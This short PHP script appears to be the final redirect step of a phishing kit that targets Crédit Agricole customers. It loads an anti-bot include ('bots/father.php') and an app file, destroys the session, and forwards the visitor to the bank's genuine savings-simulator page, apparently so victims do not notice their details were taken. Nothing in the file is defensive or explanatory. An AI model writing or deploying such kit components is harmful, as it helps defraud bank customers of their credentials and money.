<?php

include '../bots/father.php';
include_once '../inc/app.php';
$random   = rand(0,100000000000);
$LCA = substr(md5($random), 0, 17);

session_destroy();
header("location: https://www.credit-agricole.fr/particulier/simulation-devis/epargne/simulateur-livrets-d-epargne.html?displayHeaderAlternate=true");
?>
 